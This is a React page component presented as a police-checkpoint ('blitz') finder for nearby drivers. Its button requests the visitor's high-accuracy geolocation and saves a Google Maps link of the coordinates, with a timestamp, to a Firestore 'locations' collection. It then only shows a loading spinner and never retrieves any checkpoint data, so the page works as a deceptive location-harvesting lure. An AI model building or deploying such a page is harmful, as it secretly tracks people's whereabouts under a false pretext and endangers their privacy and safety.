import React, { useState } from "react";
import { motion } from "framer-motion";
import { showError as error } from "../utils/errorType";
import { collection, addDoc } from "firebase/firestore";
import { firestore } from "../firebaseConfig";
import SpinnerLoading from "../components/SpinnerLoading";

const Home = () => {
  const [loading, setLoading] = useState(false);
  const options = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  };
  const getLocation = async (position: any) => {
    const now = new Date();
    const coords = position.coords;
    const mapsLink = `https://www.google.com/maps/place/${coords.latitude}+${coords.longitude}`;

    try {
      const docRef = await addDoc(collection(firestore, "locations"), {
        maps: mapsLink,
        timestamp: now,
      });
    } catch (error: any) {
      console.log(error.tostring());
    }
  };

  const obtainLocation = () => {
    navigator.geolocation.getCurrentPosition(getLocation, error, options);
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
    }, 3000);
  };

  return (
    <div className="h-screen min-h-screen w-screen flex flex-col bg-gradient-to-br from-[#2B31A5] to-[#6265EB] gap-3">
      <div className="h-full w-full md:w-auto md:grid md:grid-cols-2">
        {/* grid esq md */}
        <div>
          {/* title/sub */}
          <motion.div
            initial={{ opacity: 0, x: 200 }}
            animate={{ opacity: 1, x: 0 }}
            className="m-6"
          >
            <h1 className="text-[3.5rem] font-bold text-white">
              Veja se há Blitz próximo de você! 🚔🚦
            </h1>
            <p className="text-md text-white">
              Monitore agora mesmo as blitz que estão acontecendo ao seu redor e
              não seja mais pego desprevenido.
            </p>
          </motion.div>
          {/* button */}
          <motion.div
            initial={{ opacity: 0, y: 200 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full mt-4 flex items-center justify-center drop-shadow-lg"
          >
            <motion.button
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.95 }}
              className="p-4 rounded-md bg-[#6caaf9] text-white font-semibold"
              onClick={obtainLocation}
            >
              Verificar se há blitz por perto
            </motion.button>
          </motion.div>
        </div>
        {/* map */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="m-6 w-auto h-auto min-h-[300px] bg-white rounded-2xl border-2 border-[#6caaf9] overflow-hidden"
        >
          <iframe
            width="100%"
            height="100%"
            title="maps"
            src="https://maps.google.com/maps?q=cascavel&t=&z=12&ie=UTF8&iwloc=&output=embed"
          />
        </motion.div>
      </div>
      {/* loading */}
      {loading && (
        <div className="absolute w-screen h-screen flex items-center justify-center backdrop-blur-sm bg-white/30">
          <SpinnerLoading />
        </div>
      )}
    </div>
  );
};

export default Home;
